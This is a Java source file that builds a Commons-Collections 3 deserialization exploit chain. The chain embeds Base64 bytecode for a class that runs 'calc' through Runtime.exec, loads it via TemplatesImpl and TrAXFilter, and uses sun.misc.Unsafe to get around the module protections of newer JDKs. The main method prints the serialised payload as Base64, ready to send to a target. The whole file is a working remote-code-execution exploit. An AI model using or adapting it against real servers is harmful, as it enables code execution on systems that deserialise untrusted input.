import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.Transformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import javassist.ClassPool;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.Unsafe;

import javax.xml.transform.Templates;

public class CC3_Bypas {

    public static byte[] getByteCode(){

        String payload = "yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQA" +
                "DKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbG" +
                "UBAAlDYWxjLmphdmEMAAoACwcAHQwAHgAfAQAEY2FsYwwAIAAhAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50a" +
                "W1lRXhjZXB0aW9uDAAKACIBAARDYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTG" +
                "phdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9Ua" +
                "HJvd2FibGU7KVYAIQAIAAkAAAAAAAIAAQAKAAsAAQAMAAAAHQABAAEAAAAFKrcAAbEAAAABAA0AAAAGAAEAAAADAAgADgALAAEADAAAAFQAAwABAA" +
                "AAF7gAAhIDtgAEV6cADUu7AAZZKrcAB7+xAAEAAAAJAAwABQACAA0AAAAWAAUAAAAGAAkACQAMAAcADQAIABYACgAPAAAABwACTAcAEAkAAQARAAAAAgAS";

        byte[] decode = Base64.getDecoder().decode(payload);
        return decode;
    }


    public static void setFieldValue(Object obj,String name,Object value) throws Exception {
        Field declaredField = obj.getClass().getDeclaredField(name);
        declaredField.setAccessible(true);
        declaredField.set(obj,value);
    }


    public  Object nu11_exp() throws Exception {

        byte[] payload = getByteCode();
        Class<?> TemplatesImplClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        BypassJDKSecurity(CC3_Bypas.class,TemplatesImplClass);
        Object templates = TemplatesImplClass.getDeclaredConstructor().newInstance();
        byte[] nu11 = ClassPool.getDefault().makeClass("nu11").toBytecode();
        setFieldValue(templates,"_bytecodes",new byte[][]{payload,nu11});
        setFieldValue(templates,"_name","nu11");
//        Class<?> TransformerFactoryImplClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl");
//        BypassJDKSecurity(CC3_Bypas.class,TransformerFactoryImplClass);
//        Object TransformerFactoryImpl = TransformerFactoryImplClass.getDeclaredConstructor().newInstance();
//        setFieldValue(templates,"_tfactory",TransformerFactoryImpl);
        setFieldValue(templates,"_transletIndex",0);

        Class<?> TrAXFilter = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");

        InvokerTransformer getAndSetObject = new InvokerTransformer(
                "getAndSetObject",new Class[]{Object.class,long.class,Object.class},
                new Object[]{Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"),60,"javax.xml"});

        InvokerTransformer get = new InvokerTransformer(
                "get",
                new Class[]{Object.class},
                new Object[]{null});

        InvokerTransformer setAccessible = new InvokerTransformer(
                "setAccessible",
                new Class[]{boolean.class},
                new Object[]{true});
        TransformerClosure transformerClosure = new TransformerClosure(setAccessible);
        ClosureTransformer setAccessibleGO = new ClosureTransformer(transformerClosure);

        InvokerTransformer getDeclaredField = new InvokerTransformer(
                "getDeclaredField",
                new Class[]{String.class},
                new Object[]{"theUnsafe"});

        ConstantTransformer getUnsafe = new ConstantTransformer(Class.forName("sun.misc.Unsafe"));

        Transformer[] transformers = new Transformer[]{
                getUnsafe,
                getDeclaredField,
                setAccessibleGO,
                get,
                getAndSetObject,
                new ConstantTransformer(TrAXFilter),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates}
                )
        };

        Transformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> innerMap = new HashMap<>();
        Map decorate = LazyMap.decorate(innerMap, chainedTransformer);
        decorate.put("nu11", "天天开心");
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, "nu11");

        HashMap<Object, Object> expMap = new HashMap<>();
        //BypassJDKSecurity(CC3_Bypas.class,expMap.getClass());
        expMap.put(tiedMapEntry,"nu11");
        decorate.remove("nu11");
        return expMap;
    }

    private static void BypassJDKSecurity(Class clazz, Class targetClass){
        try {
            Class UnsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = UnsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe)unsafeField.get(null);
            Object ObjectModule = Class.class.getMethod("getModule").invoke(targetClass);
            Class currentClass = clazz;
            long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));

            unsafe.getAndSetObject(currentClass,addr,ObjectModule);
        } catch (Exception e) {
        }
    }

    public static byte[] serialize(Object obj, boolean flag) throws Exception {
        ByteArrayOutputStream nu11 = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(nu11);
        oos.writeObject(obj);
        oos.close();
        if (flag) System.out.println(Base64.getEncoder().encodeToString(nu11.toByteArray()));
        return nu11.toByteArray();
    }

    public static void main(String[] args) throws Exception {
          serialize(new CC3_Bypas().nu11_exp(),true);
    }
}
